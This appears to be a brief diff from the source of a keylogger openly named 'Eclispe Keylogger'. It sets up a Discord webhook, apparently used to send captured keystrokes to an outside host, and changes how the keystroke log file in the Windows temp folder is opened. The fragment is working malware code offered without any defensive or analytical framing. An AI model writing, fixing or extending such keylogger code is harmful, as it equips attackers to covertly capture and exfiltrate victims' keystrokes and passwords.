@@ -15,7 +15,7 @@ webhook = DiscordWebhook(
     url='{webhook}',
     username='Eclispe Keylogger')
 
-if not os.path.exists('C:\\\\Windows\\\\temp\\\\Keystroke_Handler.ksh'):
+if os.path.exists('C:\\\\Windows\\\\temp\\\\Keystroke_Handler.ksh'):
     f = open('C:\\\\Windows\\\\temp\\\\Keystroke_Handler.ksh', 'a')
 else:
     f = open('C:\\\\Windows\\\\temp\\\\Keystroke_Handler.ksh', 'w')
